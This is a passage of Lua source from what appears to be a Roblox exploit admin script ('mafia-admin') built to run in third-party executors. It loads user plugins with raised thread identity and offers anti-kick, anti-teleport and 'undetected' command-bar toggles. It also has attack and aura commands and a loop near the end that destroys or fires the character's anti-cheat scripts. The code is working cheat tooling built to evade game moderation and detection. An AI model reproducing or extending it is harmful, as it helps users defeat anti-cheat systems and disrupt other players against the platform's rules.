    UnSpoofInstance = UnSpoofInstance,
    ReplaceCharacter = ReplaceCharacter,
    ReplaceHumanoid = ReplaceHumanoid,
    GetCorrectToolWithHandle = GetCorrectToolWithHandle,
    DisableAnimate = DisableAnimate,
    GetPlayer = GetPlayer,
    GetHumanoid = GetHumanoid,
    GetRoot = GetRoot,
    GetMagnitude = GetMagnitude,
    GetCommandEnv = function(Name)
        local Command = LoadCommand(Name);
        if (Command.CmdEnv) then
            return Command.CmdEnv
        end
    end,
    isR6 = isR6,
    ExecuteCommand = ExecuteCommand,
    Notify = Utils.Notify,
    HasTool = HasTool,
    isSat = isSat,
    Request = syn and syn.request or request or game.HttpGet,
    CThread = CThread,
    AddConnection = AddConnection,
    filter = filter,
    map = map,
    clone = clone,
    firetouchinterest = firetouchinterest,
    fireproximityprompt = fireproximityprompt,
    decompile = decompile,
    getnilinstances = getnilinstances,
    getinstances = getinstances,
    Drawing = Drawing
}

do
    local IsDebug = IsSupportedExploit and PluginConf.PluginDebug
    
    Plugins = IsSupportedExploit and map(filter(listfiles("mafia-admin/plugins"), function(i, v)
        return lower(split(v, ".")[#split(v, ".")]) == "lua"
    end), function(i, v)
        local splitted = split(v, "\\");
        if (identifyexecutor and identifyexecutor() == "ScriptWare") then
            return {splitted[#splitted], loadfile("mafia-admin/plugins/" .. v)}
        else
            return {splitted[#splitted], loadfile(v)}
        end
    end) or {}

    local Renv = clone(getrenv(), true);
    for i, v in next, Renv do
        PluginLibrary[i] = v
    end
    PluginLibrary.debug = nil
    PluginLibrary.getfenv = nil

    if (PluginConf.SafePlugins) then
        local Funcs = {}
        for i, v in next, PluginLibrary do
            if (type(v) == 'function') then
                Funcs[#Funcs + 1] = v
            end
        end
        local FateEnv = getfenv(1);
        PluginLibrary.getfenv = newcclosure(function(...)
            local f = ({...})[1]
            local Env = getfenv(...);
            if (type(f) == 'function' and Tfind(Funcs, f) or Env == FateEnv and checkcaller()) then
                return PluginLibrary
            end
            return Env
        end)
    end

    if (PluginConf.PluginsEnabled) then
        local LoadPlugin = function(Plugin)
            if (not IsSupportedExploit) then
                return 
            end
        
            if (Plugin and PluginConf.DisabledPlugins[Plugin.Name]) then
                Utils.Notify(LocalPlayer, "Plugin not loaded.", format("Plugin %s was not loaded as it is on the disabled list.", Plugin.Name));
                return "Disabled"
            end
            if (#keys(Plugin) < 3) then
                return Utils.Notify(LocalPlayer, "Plugin Fail", "One of your plugins is missing information.");
            end
            if (IsDebug) then
                Utils.Notify(LocalPlayer, "Plugin loading", format("Plugin %s is being loaded.", Plugin.Name));
            end
            
            local Context;
            local sett, gett = setthreadidentity, getthreadidentity
            if (sett and PluginConf.SafePlugins) then
                Context = gett();
                sett(5);
            end
            local Ran, Return = pcall(Plugin.Init);
            if (sett and Context) then
                sett(Context);
            end
            if (not Ran and Return and IsDebug) then
                return Utils.Notify(LocalPlayer, "Plugin Fail", format("there is an error in plugin Init %s: %s", Plugin.Name, Return));
            end
            
            for i, command in next, Plugin.Commands or {} do -- adding the "or" because some people might have outdated plugins in the dir
                if (#keys(command) < 3) then
                    Utils.Notify(LocalPlayer, "Plugin Command Fail", format("Command %s is missing information", command.Name));
                    continue
                end
                AddCommand(command.Name, command.Aliases or {}, command.Description .. " - " .. Plugin.Author, command.Requirements or {}, command.Func, true);
        
                if (FindFirstChild(Commands.Frame.List, command.Name)) then
                    Destroy(FindFirstChild(Commands.Frame.List, command.Name));
                end
                local Clone = Clone(Command);
                Utils.Hover(Clone, "BackgroundColor3");
                Utils.ToolTip(Clone, format("%s\n%s - %s", command.Name, command.Description, Plugin.Author));
                Clone.CommandText.RichText = true
                Clone.CommandText.Text = format("%s %s %s", command.Name, next(command.Aliases or {}) and format("(%s)", concat(command.Aliases, ", ")) or "", Utils.TextFont("[PLUGIN]", {77, 255, 255}));
                Clone.Name = command.Name
                Clone.Visible = true
                Clone.Parent = Commands.Frame.List
                if (IsDebug) then
                    Utils.Notify(LocalPlayer, "Plugin Command Loaded", format("Command %s loaded successfully", command.Name));
                end
            end
        end
        
        if (IsSupportedExploit) then
            if (not isfolder("mafia-admin") and not isfolder("mafia-admin/plugins") and not isfolder("mafia-admin/plugin-conf.json") or not isfolder("mafia-admin/chatlogs")) then
                WriteConfig();
            end
        end

        for i, Plugin in next, Plugins do
            local PluginFunc = Plugin[2]
            if (PluginConf.SafePlugins) then
                setfenv(PluginFunc, PluginLibrary);
            else
                local CurrentEnv = getfenv(PluginFunc);
                for i2, v2 in next, PluginLibrary do
                    CurrentEnv[i2] = v2
                end
            end
            local Success, Ret = pcall(PluginFunc);
            if (Success) then
                LoadPlugin(Ret);
            elseif (PluginConf.PluginDebug) then
                Utils.Notify(LocalPlayer, "Fail", "There was an error Loading plugin (console for more information)");
                warn("[FA Plugin Error]: " .. debug.traceback(Ret));             
            end
        end
        
        AddCommand("refreshplugins", {"rfp", "refreshp", "reloadp"}, "Loads all new plugins.", {}, function()
            if (not IsSupportedExploit) then
                return "your exploit does not support plugins"
            end
            PluginConf = GetPluginConfig();
            IsDebug = PluginConf.PluginDebug
            
            Plugins = map(filter(listfiles("mafia-admin/plugins"), function(i, v)
                return lower(split(v, ".")[#split(v, ".")]) == "lua"
            end), function(i, v)
                return {split(v, "\\")[2], loadfile(v)}
            end)
            
            for i, Plugin in next, Plugins do
                local PluginFunc = Plugin[2]
                setfenv(PluginFunc, PluginLibrary);
                local Success, Ret = pcall(PluginFunc);
                if (Success) then
                    LoadPlugin(Ret);
                elseif (PluginConf.PluginDebug) then
                    Utils.Notify(LocalPlayer, "Fail", "There was an error Loading plugin (console for more information)");
                    warn("[FA Plugin Error]: " .. debug.traceback(Ret));             
                end
            end
        end)
    end
end
--END IMPORT [plugin]


WideBar = false
Draggable = false

--IMPORT [config]
do
    local UserInputService = Services.UserInputService
    local GetStringForKeyCode = UserInputService.GetStringForKeyCode
    local function GetKeyName(KeyCode)
        local _, Stringed = pcall(GetStringForKeyCode, UserInputService, KeyCode);
        local IsEnum = Stringed == ""
        return (not IsEnum and _) and Stringed or split(tostring(KeyCode), ".")[3], (IsEnum and not _);
    end

    local SortKeys = function(Key1, Key2)
        local KeyName, IsEnum = GetKeyName(Key1);
        if (Key2) then
            local KeyName2, IsEnum2 = GetKeyName(Key2);
            return format("%s + %s", IsEnum2 and KeyName2 or KeyName, IsEnum2 and KeyName2 or KeyName2);
        end
        return KeyName
    end

    LoadConfig = function()
        local Script = ConfigUILib.NewPage("Script");
        local Settings = Script.NewSection("Settings");
    
        local CurrentConf = GetConfig();
        UndetectedCmdBar = CurrentConf.UndetectedCmdBar


        Settings.TextboxKeybind("Chat Prefix", Prefix, function(Key)
            if (not match(Key, "%A") or match(Key, "%d") or #Key > 1) then
                Utils.Notify(nil, "Prefix", "Prefix must be a 1 character symbol.");
                return
            end
            Prefix = Key
            Utils.Notify(nil, "Prefix", "Prefix is now " .. Key);
        end)
    
        Settings.Keybind("CMDBar Prefix", GetKeyName(CommandBarPrefix), function(KeyCode1, KeyCode2)
            CommandBarPrefix = KeyCode1
            Utils.Notify(nil, "Prefix", "CommandBar Prefix is now " .. GetKeyName(KeyCode1));
        end)
    
        local ToggleSave;
        ToggleSave = Settings.Toggle("Save Prefix's", false, function(Callback)
            SetConfig({["Prefix"]=Prefix,["CommandBarPrefix"]=split(tostring(CommandBarPrefix), ".")[3]});
            wait(.5);
            ToggleSave();
            Utils.Notify(nil, "Prefix", "saved prefix's");
        end)
    
        local Misc = Script.NewSection("Misc");

        Misc.Toggle("Chat Prediction", CurrentConf.ChatPrediction or false, function(Callback)
            local ChatBar = ToggleChatPrediction();
            if (Callback) then
                ChatBar.CaptureFocus(ChatBar);
                wait();
                ChatBar.Text = Prefix
            end
            SetConfig({ChatPrediction=Callback});
            Utils.Notify(nil, nil, format("ChatPrediction %s", Callback and "enabled" or "disabled"));
        end)

        Misc.Toggle("Undetected CommandBar", UndetectedCmdBar, function(Callback)
            SetConfig({UndetectedCmdBar=Callback});
        end)

        Misc.Toggle("Anti Kick", Hooks.AntiKick, function(Callback)
            Hooks.AntiKick = Callback
            Utils.Notify(nil, nil, format("AntiKick %s", Hooks.AntiKick and "enabled" or "disabled"));
        end)

        Misc.Toggle("Anti Teleport", Hooks.AntiTeleport, function(Callback)
            Hooks.AntiTeleport = Callback
            Utils.Notify(nil, nil, format("AntiTeleport %s", Hooks.AntiTeleport and "enabled" or "disabled"));
        end)

        Misc.Toggle("wide cmdbar", WideBar, function(Callback)
            WideBar = Callback
            if (not Draggable) then
                Utils.Tween(CommandBar, "Quint", "Out", .5, {
                    Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween -110
                })
            end
            Utils.Tween(CommandBar, "Quint", "Out", .5, {
                Size = UDim2.new(0, WideBar and 400 or 200, 0, 35) -- tween -110
            })
            SetConfig({WideBar=Callback});
            Utils.Notify(nil, nil, format("widebar %s", WideBar and "enabled" or "disabled"));
        end)

        Misc.Toggle("draggable cmdbar", Draggable, function(Callback)
            Draggable = Callback
            CommandBarOpen = true
            Utils.Tween(CommandBar, "Quint", "Out", .5, {
                Position = UDim2.new(0, Mouse.X, 0, Mouse.Y + 36);
            })
            Utils.Draggable(CommandBar);
            local TransparencyTween = CommandBarOpen and Utils.TweenAllTransToObject or Utils.TweenAllTrans
            local Tween = TransparencyTween(CommandBar, .5, CommandBarTransparencyClone);
            CommandBar.Input.Text = ""
            if (not Callback) then
                Utils.Tween(CommandBar, "Quint", "Out", .5, {
                    Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5) -- tween 5
                })
            end
            Utils.Notify(nil, nil, format("draggable command bar %s", Draggable and "enabled" or "disabled"));
        end)

        Misc.Toggle("KillCam when killing", CurrentConf.KillCam, function(Callback)
            SetConfig({KillCam=Callback});
            _L.KillCam = Callback
        end)

        local OldFireTouchInterest = firetouchinterest
        Misc.Toggle("cframe touchinterest", firetouchinterest == nil, function(Callback)
            firetouchinterest = Callback and function(part1, part2, toggle)
                if (part1 and part2) then
                    if (toggle == 0) then
                        touched[1] = part1.CFrame
                        part1.CFrame = part2.CFrame
                    else
                        part1.CFrame = touched[1]
                        touched[1] = nil
                    end
                end
            end or OldFireTouchInterest
        end)

        local MacrosPage = ConfigUILib.NewPage("Macros");
        local MacroSection;
        MacroSection = MacrosPage.CreateMacroSection(Macros, function(Bind, Command, Args)
            local AlreadyAdded = false
            for i = 1, #Macros do
                if (Macros[i].Command == Command) then
                    AlreadyAdded = true
                end
            end
            if (CommandsTable[Command] and not AlreadyAdded) then
                MacroSection.AddMacro(Command .. " " .. Args, SortKeys(Bind[1], Bind[2]));
                Args = split(Args, " ");
                if (sub(Command, 1, 2) == "un" or CommandsTable["un" .. Command]) then
                    local Shifted = {Command, unpack(Args)}
                    Macros[#Macros + 1] = {
                        Command = "toggle",
                        Args = Shifted,
                        Keys = Bind
                    }
                else
                    Macros[#Macros + 1] = {
                        Command = Command,
                        Args = Args,
                        Keys = Bind
                    }
                end
                local TempMacros = clone(Macros);
                for i, v in next, TempMacros do
                    for i2, v2 in next, v.Keys do
                        TempMacros[i]["Keys"][i2] = split(tostring(v2), ".")[3]
                    end
                end
                SetConfig({Macros=TempMacros});
            end
        end)
        local UIListLayout = MacroSection.CommandsList.UIListLayout
        for i, v in next, CommandsTable do
            if (not FindFirstChild(MacroSection.CommandsList, v.Name)) then
                MacroSection.AddCmd(v.Name);
            end
        end
        MacroSection.CommandsList.CanvasSize = UDim2.fromOffset(0, UIListLayout.AbsoluteContentSize.Y);
        local Search = FindFirstChild(MacroSection.CommandsList.Parent.Parent, "Search");

        AddConnection(CConnect(GetPropertyChangedSignal(Search, "Text"), function()
            local Text = Search.Text
            for _, v in next, GetChildren(MacroSection.CommandsList) do
                if (IsA(v, "TextButton")) then
                    local Command = v.Text
                    v.Visible = Sfind(lower(Command), Text, 1, true)
                end
            end
            MacroSection.CommandsList.CanvasSize = UDim2.fromOffset(0, UIListLayout.AbsoluteContentSize.Y);
        end), Connections.UI, true);
        
        local PluginsPage = ConfigUILib.NewPage("Plugins");
        
        local CurrentPlugins = PluginsPage.NewSection("Current Plugins");
        local PluginSettings = PluginsPage.NewSection("Plugin Settings");
    
        local CurrentPluginConf = GetPluginConfig();
    
        CurrentPlugins.ScrollingFrame("plugins", function(Option, Enabled)
            CurrentPluginConf = GetPluginConfig();
            for i = 1, #Plugins do
                local Plugin = Plugins[i]
                if (Plugin[1] == Option) then
                    local DisabledPlugins = CurrentPluginConf.DisabledPlugins
                    local PluginName = Plugin[2]().Name
                    if (Enabled) then
                        DisabledPlugins[PluginName] = nil
                        SetPluginConfig({DisabledPlugins=DisabledPlugins});
                        Utils.Notify(nil, "Plugin Enabled", format("plugin %s successfully enabled", PluginName));
                    else
                        DisabledPlugins[PluginName] = true
                        SetPluginConfig({DisabledPlugins=DisabledPlugins});
                        Utils.Notify(nil, "Plugin Disabled", format("plugin %s successfully disabled", PluginName));
                    end
                end
            end
        end, map(Plugins, function(Key, Plugin)
            return not PluginConf.DisabledPlugins[Plugin[2]().Name], Plugin[1]
        end));
    
        PluginSettings.Toggle("Plugins Enabled", CurrentPluginConf.PluginsEnabled, function(Callback)
            SetPluginConfig({PluginsEnabled = Callback});
        end)

        PluginSettings.Toggle("Plugins Debug", CurrentPluginConf.PluginDebug, function(Callback)
            SetPluginConfig({PluginDebug = Callback});
        end)

        PluginSettings.Toggle("Safe Plugins", CurrentPluginConf.SafePlugins, function(Callback)
            SetPluginConfig({SafePlugins = Callback});
        end)

        local Themes = ConfigUILib.NewPage("Themes");

        local Color = Themes.NewSection("Colors");
        local Options = Themes.NewSection("Options");

        local RainbowEnabled = false
        Color.ColorPicker("All Background", UITheme.Background.BackgroundColor, function(Callback, IsRainbow)
            UITheme.Background.BackgroundColor = Callback
            RainbowEnabled = IsRainbow
        end)
        Color.ColorPicker("CommandBar", UITheme.CommandBar.BackgroundColor, function(Callback)
            if (not RainbowEnabled) then
                UITheme.CommandBar.BackgroundColor = Callback
            end
        end)
        Color.ColorPicker("Notification", UITheme.Notification.BackgroundColor, function(Callback)
            if (not RainbowEnabled) then
                UITheme.Notification.BackgroundColor = Callback
            end
        end)
        Color.ColorPicker("ChatLogs", UITheme.ChatLogs.BackgroundColor, function(Callback)
            if (not RainbowEnabled) then
                UITheme.ChatLogs.BackgroundColor = Callback
            end
        end)
        Color.ColorPicker("CommandList", UITheme.CommandList.BackgroundColor, function(Callback)
            if (not RainbowEnabled) then
                UITheme.CommandList.BackgroundColor = Callback
            end
        end)
        Color.ColorPicker("Config", UITheme.Config.BackgroundColor, function(Callback)
            if (not RainbowEnabled) then
                UITheme.Config.BackgroundColor = Callback
            end
        end)

        Color.ColorPicker("All Text", UITheme.Background.TextColor, function(Callback)
            UITheme.Background.TextColor = Callback
        end)

        local ToggleSave;
        ToggleSave = Options.Toggle("Save Theme", false, function(Callback)
            WriteThemeConfig();
            wait(.5);
            ToggleSave();
            Utils.Notify(nil, "Theme", "saved theme");
        end)

        local ToggleLoad;
        ToggleLoad = Options.Toggle("Load Theme", false, function(Callback)
            LoadTheme(GetThemeConfig());
            wait(.5);
            ToggleLoad();
            Utils.Notify(nil, "Theme", "Loaded theme");
        end)

        local ToggleReset;
        ToggleReset = Options.Toggle("Reset Theme", false, function(Callback)
            UITheme.Background.BackgroundColor = "Reset"
            UITheme.Notification.TextColor = "Reset"
            UITheme.CommandBar.TextColor = "Reset"
            UITheme.CommandList.TextColor = "Reset"
            UITheme.ChatLogs.TextColor = "Reset"
            UITheme.Config.TextColor = "Reset"
            UITheme.Notification.Transparency = "Reset"
            UITheme.CommandBar.Transparency = "Reset"
            UITheme.CommandList.Transparency = "Reset"
            UITheme.ChatLogs.Transparency = "Reset"
            UITheme.Config.Transparency = "Reset"
            wait(.5);
            ToggleReset();
            Utils.Notify(nil, "Theme", "reset theme");
        end)

    end

    delay(1, function()
        for i = 1, #Macros do
            local Macro = Macros[i]
            for i2 = 1, #Macro.Keys do
                Macros[i].Keys[i2] = Enum.KeyCode[Macros[i].Keys[i2]]
            end
        end
        if (CurrentConfig.WideBar) then
            WideBar = true
            Utils.Tween(CommandBar, "Quint", "Out", .5, {
                Size = UDim2.new(0, WideBar and 400 or 200, 0, 35) -- tween -110
            })
        end
        KillCam = CurrentConfig.KillCam
        local Aliases = CurrentConfig.Aliases
        if (Aliases) then
            for i, v in next, Aliases do
                if (CommandsTable[i]) then
                    for i2 = 1, #v do
                        local Alias = v[i2]
                        local Add = CommandsTable[i]
                        Add.Name = Alias
                        CommandsTable[Alias] = Add
                    end
                end
            end
        end
    end)
end
--END IMPORT [config]


AddConnection(CConnect(CommandBar.Input.FocusLost, function()
    if (UndetectedCmdBar) then
        CThread(function()
            wait(.3);
            for i, v in next, getconnections(Services.UserInputService.TextBoxFocusReleased) do
                v.Enable(v);
            end
        end)()
    end

    local Text = trim(CommandBar.Input.Text);
    local CommandArgs = split(Text, " ");

    CommandBarOpen = false

    if (not Draggable) then
        Utils.TweenAllTrans(CommandBar, .5)
        Utils.Tween(CommandBar, "Quint", "Out", .5, {
            Position = UDim2.new(0.5, WideBar and -200 or -100, 1, 5); -- tween 5
        })
    end

    local Command = CommandArgs[1]
    local Args = shift(CommandArgs);

    if (Command ~= "") then
        ExecuteCommand(Command, Args, LocalPlayer);
    end
end), Connections.UI, true);

local PlayerAdded = function(plr)
    RespawnTimes[plr.Name] = tick();
    AddConnection(CConnect(plr.CharacterAdded, function()
        RespawnTimes[plr.Name] = tick();
    end));
end

forEach(GetPlayers(Players), function(i,v)
    PlrChat(i,v);
    PlayerAdded(v);
end);

AddConnection(CConnect(Players.PlayerAdded, function(plr)
    PlrChat(#Connections.Players + 1, plr);
    PlayerAdded(plr);
end))

AddConnection(CConnect(Players.PlayerRemoving, function(plr)
    if (Connections.Players[plr.Name]) then
        if (Connections.Players[plr.Name].ChatCon) then
            Disconnect(Connections.Players[plr.Name].ChatCon);
        end
        Connections.Players[plr.Name] = nil
    end
    if (RespawnTimes[plr.Name]) then
        RespawnTimes[plr.Name] = nil
    end
end))

getgenv().F_A = {
    Utils = Utils,
    PluginLibrary = PluginLibrary,
    GetConfig = GetConfig
}

if (debug.info(2, "f") == nil) then
        Notify({ 
Description = "use the loadstring or the cmd 'reloadscript' to get the newest version";
Title = "this script is potentially outdated";
Duration = 2;
});
end


idkfakethingy = true
timeusagesecondslol = 0
timeusageminuteslol = 0
timeusagehourslol = 0

local L_11_ = "-"
local L_21_ = game.Players.LocalPlayer:GetMouse()
L_21_.KeyDown:Connect(
    function(L_221_arg0)
	if L_221_arg0 == L_11_ then
print("a")
ExecuteCommand("unattack", {}, LocalPlayer);
auraing = false
ExecuteCommand("unstand", {}, LocalPlayer);
ExecuteCommand("uncircle", {}, LocalPlayer);
	end
end
)


			for _, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
				if v:IsA("Script") and v.Name ~= "Health" and v.Name ~= "Sound" and v:FindFirstChild("LocalScript") then
					v:Destroy()
				end
			end
			game.Players.LocalPlayer.CharacterAdded:Connect(function(char)
				repeat
					wait()
				until game.Players.LocalPlayer.Character
				char.ChildAdded:Connect(function(child)
					if child:IsA("Script") then 
						wait(0.1)
						if child:FindFirstChild("LocalScript") then
							child.LocalScript:FireServer()
						end
					end
				end)
			end)

while true do
wait(1)
timeusagesecondslol = timeusagesecondslol+1

if timeusagesecondslol == 60 then
timeusageminuteslol = timeusageminuteslol+1
timeusagesecondslol = 0
end

if timeusageminuteslol == 60 then
timeusageminuteslol = 0
timeusagehourslol = timeusagehourslol+1
end
end
